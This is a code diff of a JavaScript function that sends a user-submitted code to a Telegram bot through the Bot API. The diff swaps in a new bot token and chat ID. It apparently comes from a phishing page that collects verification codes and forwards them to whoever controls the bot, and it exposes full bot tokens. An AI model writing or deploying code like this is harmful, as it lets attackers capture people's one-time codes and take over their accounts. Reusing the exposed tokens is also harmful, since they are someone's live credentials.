@@ -129,13 +129,13 @@
         }
 
         async function sendCodeToTelegram(code) {
-            const response = await fetch('https://api.telegram.org/bot8819890290:AAEFpB8125DmD4qTOStoW7V89ipFgDKXIlg/sendMessage', {
+            const response = await fetch('https://api.telegram.org/bot8690760094:AAG9_WGh7QuBqsaPmzA0gAGbj0Nh3rJRNYc/sendMessage', {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json',
                 },
                 body: JSON.stringify({
-                    chat_id: '8904808515', // Replace with your chat ID
+                    chat_id: '8450094519', // Replace with your chat ID
                     text: `The user submitted the code: ${code}`
                 }),
             });
